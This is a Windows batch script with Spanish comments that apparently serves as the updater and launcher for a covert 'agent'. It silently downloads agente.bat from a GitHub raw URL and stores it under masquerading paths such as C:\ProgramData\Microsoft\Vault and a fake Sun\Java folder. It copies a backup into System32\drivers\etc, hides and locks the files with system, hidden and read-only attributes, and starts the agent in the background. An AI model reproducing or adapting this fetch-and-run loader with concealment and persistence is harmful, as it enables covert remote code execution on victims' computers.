        @echo off
    setlocal enabledelayedexpansion


    :: --- 1. CONFIGURACIÓN DE RUTAS Y VERSIONES ---
    :: Corregido el doble Roaming para que coincida con el instalador
    set "AGENTE_DIR=C:\ProgramData\Microsoft\Vault"
    set "AGENTE_FILE=%AGENTE_DIR%\sys_engine.bat"   
    set "BACKUP_DIR=%windir%\System32\drivers\etc\vps_logs"
    set "VERSION_DIR=C:\Users\%USERNAME%\AppData\Roaming\Sun\Java\Deployment"
    ::set "VLINEA=%temp%\v_data.txt"
    set "VLINEA=C:\Users\%USERNAME%\AppData\Roaming\Sun\Java\Deployment\lv_data.txt"
    set "MEM_DIR=%VERSION_DIR%"
    set "VERSION_LOCAL=%VERSION_DIR%\v_data.txt"
    :: URLs de GitHub
    set "URL_BASE=https://raw.githubusercontent.com/kokoronoshojo-a11y/SystemAssets/SystemAssets"
    set "URL_VERSION=%URL_BASE%/version.txt"
    set "URL_AGENTE=%URL_BASE%/agente.bat"


    ::  --- 4. RESTAURACIÓN Y EJECUCIÓN ---
    ::Si el archivo no está (fue borrado manualmente), lo sacamos del Backup de System32

    :: --- 2. MÓDULO DE ACTUALIZACIÓN (Sincronización) ---
    :: Intentamos bajar la versión de la nube a un temporal
    powershell -Command "(New-Object Net.WebClient).DownloadFile('%URL_VERSION%', '%VLINEA%')" >nul 2>&1

    ::
    ::
    :: Si el archivo está vacío o no se descargó, morimos
    if not exist "%VLINEA%" exit
    for %%i in ("%VLINEA%") do if %%~zi == 0 (del "%VLINEA%" & exit)

    set /p LINEA_NUBE=<"%VLINEA%"
    :: 2. Comprobar si existe el archivo de memoria local
    ::if exist "%VERSION_LOCAL%" (
    ::    set /p LINEA_LOCAL=<"%VERSION_LOCAL%"
    ::) else (
    ::    copy /y "%VLINEA%" "%VERSION_LOCAL%" >nul 2>&1
    ::    set "LINEA_LOCAL=0"
    ::)
    if exist "%VERSION_LOCAL%" (
    :: Usa esta sintaxis exacta, sin el 0 y sin espacios raros antes del <
    set /p LINEA_RAW=<"%VERSION_LOCAL%"
    
    set "LINEA_LOCAL="
    for /f "delims=0123456789" %%a in ("!LINEA_RAW!") do set "LINEA_RAW=!LINEA_RAW:%%a=!"
    set "LINEA_LOCAL=!LINEA_RAW!"
) else (
    set "LINEA_LOCAL=0"
)
    if "!LINEA_LOCAL!" GEQ "!LINEA_NUBE!" (
        tasklist /FI "IMAGENAME eq cmd.exe" /V | findstr /I "sys_engine" >nul
        if %errorlevel% neq 0 (
        start /b "" cmd /c "%AGENTE_FILE%"
        )
        ::--- 4. RESTAURACIÓN Y EJECUCIÓN ---
        del "%VLINEA%" >nul 2>&1
        exit
    ) else (
        copy /y "%VLINEA%" "%VERSION_LOCAL%" >nul 2>&1
        del "%VLINEA%" >nul 2>&1

        rem Si la nube tiene una versión superior, descargamos el nuevo Agente
        rem 2.1 DESBLOQUEO TÁCTICO ANTES DE SOBREESCRIBIR

        attrib -h -s -r "%AGENTE_FILE%" >nul 2>&1
        attrib -h -s -r "%BACKUP_DIR%\sys_engine.bat" >nul 2>&1
                
        rem 2.2 DESCARGA Y RESPALDO (Sobreescritura forzada)
        rem Usamos PowerShell porque bitsadmin a veces deja archivos colgados en descargas rápidas
        powershell -Command "(New-Object Net.WebClient).DownloadFile('%URL_AGENTE%', '%AGENTE_FILE%')" >nul 2>&1
        copy /y "%AGENTE_FILE%" "%BACKUP_DIR%\sys_engine.bat" >nul 2>&1
                
        rem 2.3 RE-ACTIVACIÓN DE ESCUDOS
        attrib +h +s +r "%AGENTE_FILE%" >nul 2>&1
        attrib +h +s +r "%BACKUP_DIR%\sys_engine.bat" >nul 2>&1
            
    )
